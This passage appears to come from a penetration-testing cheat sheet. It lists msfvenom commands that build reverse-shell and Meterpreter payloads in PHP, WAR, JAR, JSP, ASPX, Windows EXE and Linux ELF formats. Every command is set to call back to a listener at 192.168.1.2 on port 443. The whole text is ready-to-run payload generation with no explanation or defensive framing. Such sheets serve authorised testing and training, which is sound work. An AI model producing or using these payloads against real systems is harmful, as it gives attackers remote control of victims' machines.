msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
```

```cmd
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
```

# <kbd>War Payload</kbd>

```cmd
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
```

# <kbd>JAR Payload</kbd>

```cmd
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f jar > reverse.jar
```

# <kbd>JSP Payload</kbd>

```cmd
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.jsp
```

# <kbd>ASPX Payload</kbd>

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
```

---

# <kbd>Windows Payloads</kbd>

# <kbd>Windows Listener Netcat</kbd>

<kbd>x86 - Shell</kbd>

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

<kbd>x64 - Shell</kbd>

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

# <kbd>Windows Listener Metasploit Multi Handler</kbd>

<kbd>x86 - Meterpreter</kbd>

```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

<kbd>x64 - Meterpreter</kbd>

```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```
   
<kbd>x86 - Shell</kbd>

```cmd
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

<kbd>x64 - Shell</kbd>

```cmd
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

---

# <kbd>Linux Payloads</kbd>
 
# <kbd>Linux Listener Netcat</kbd>

<kbd>x86 - Shell</kbd>

```cmd
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```
 
<kbd>x64 - Shell</kbd>

```cmd
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

---

# <kbd>Linux Listener Metasploit Multi Handler</kbd>

<kbd>x86 - Meterpreter</kbd>

```cmd
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

<kbd>x64 - Meterpreter</kbd>

```cmd
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

<kbd>x86 - Shell</kbd>

```cmd
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

<kbd>x64 - Shell</kbd>

```cmd
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

---
